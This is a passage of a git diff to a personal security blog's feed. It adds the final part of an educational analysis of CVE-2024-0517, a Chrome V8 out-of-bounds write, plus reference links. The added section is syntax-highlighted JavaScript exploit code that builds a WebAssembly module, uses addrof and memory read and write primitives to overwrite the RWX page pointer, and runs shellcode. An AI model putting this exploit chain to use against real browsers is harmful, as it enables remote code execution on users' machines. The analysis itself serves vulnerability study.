class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">106</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">98</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">107</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">137</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">195</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">233</span><span class="p">,</span><span class="mi">67</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span>
+<span class="p">]);</span>
+
+<span class="kd">let</span> <span class="nx">wasmModule</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nc">Module</span><span class="p">(</span><span class="nx">wasmCode</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">wasmInstance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nc">Instance</span><span class="p">(</span><span class="nx">wasmModule</span><span class="p">,</span> <span class="nx">importObject</span><span class="p">);</span>
+
+<span class="kd">let</span> <span class="nx">wasmInstance_addr</span> <span class="o">=</span> <span class="nf">addrof</span><span class="p">(</span><span class="nx">wasmInstance</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">RWX_page_pointer</span> <span class="o">=</span> <span class="nf">v8h_read64</span><span class="p">(</span><span class="nx">wasmInstance_addr</span><span class="o">+</span><span class="mh">0x48</span><span class="nx">n</span><span class="p">);</span>
+
+<span class="kd">let</span> <span class="nx">func_make_array</span> <span class="o">=</span> <span class="nx">wasmInstance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">make_array</span><span class="p">;</span>
+
+<span class="kd">let</span> <span class="nx">func_main</span> <span class="o">=</span> <span class="nx">wasmInstance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
+<span class="nf">wasm_write</span><span class="p">(</span><span class="nx">wasmInstance_addr</span><span class="o">+</span><span class="mh">0x48</span><span class="nx">n</span><span class="p">,</span> <span class="nx">shell_code_addr</span><span class="p">);</span>
+<span class="nf">func_main</span><span class="p">();</span>
+</code></pre></div></div>
 
 <h3 id="running-shellcode">Running Shellcode</h3>
-<ol>
-  <li>exploit 시연 <br /></li>
-</ol>
+
+<!-- Courtesy of embedresponsively.com -->
+
+<div class="responsive-video-container">
+    <iframe src="https://www.youtube-nocookie.com/embed/NrDJdX5QbUQ" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe>
+  </div>
 
 <h1 id="conclusion">Conclusion</h1>
-<ol>
-  <li>내가 이 글을 쓰는 목표한 바, 어떤 취약점이였는지 총정리 <br /></li>
-</ol>
+<p>It is my first time to analyze 1-day Exploit. Hence I bumped into many problems to investigate and analyze. I aspirate that this blog will help you especially for a beginner. <br />
+Thank to watch my blog. <br /></p>
 
-<h1 id="preferences">Preferences</h1>]]></content><author><name>Minkyun Sung</name><email>bnovkebin@gmail.com</email></author><category term="blog" /><category term="1-day" /><category term="chrome" /><category term="v8" /><summary type="html"><![CDATA[A deep dive about CVE-2024-0517]]></summary></entry><entry><title type="html">Hello World</title><link href="http://localhost:4000/blog/first_post/" rel="alternate" type="text/html" title="Hello World" /><published>2024-08-08T00:00:00+09:00</published><updated>2024-08-08T00:00:00+09:00</updated><id>http://localhost:4000/blog/first_post</id><content type="html" xml:base="http://localhost:4000/blog/first_post/"><![CDATA[<h1 id="short-info">Short info</h1>
+<h1 id="preferences">Preferences</h1>
+<ul>
+  <li><a href="https://blog.exodusintel.com/2024/01/19/google-chrome-v8-cve-2024-0517-out-of-bounds-write-code-execution/">Exodus Blog Google Chrome V8 CVE-2024-0517 Out-of-Bounds Write Code Execution</a> <br /></li>
+  <li><a href="https://chromium.googlesource.com/v8/v8.git/+/e73f620c2ef1230ddaa61551706225821a87c3b9">Chrome V8 Version 12.0.267.15</a> <br /></li>
+  <li><a href="https://chromiumdash.appspot.com/releases?platform=Linux">Chrome Release</a></li>
+  <li><a href="https://deepu.tech/memory-management-in-v8/">Garbage Collection - Visualizing memory management in V8 Engine (JavaScript, NodeJS, Deno, WebAssembly)</a></li>
+</ul>]]></content><author><name>Minkyun Sung</name><email>bnovkebin@gmail.com</email></author><category term="blog" /><category term="1-day" /><category term="chrome" /><category term="v8" /><summary type="html"><![CDATA[A deep dive about CVE-2024-0517]]></summary></entry><entry><title type="html">Hello World</title><link href="http://localhost:4000/blog/first_post/" rel="alternate" type="text/html" title="Hello World" /><published>2024-08-08T00:00:00+09:00</published><updated>2024-08-08T00:00:00+09:00</updated><id>http://localhost:4000/blog/first_post</id><content type="html" xml:base="http://localhost:4000/blog/first_post/"><![CDATA[<h1 id="short-info">Short info</h1>
 
 <p>This is my first post with github blog. <br />
 I’ll share my interests in cyber security. <br />
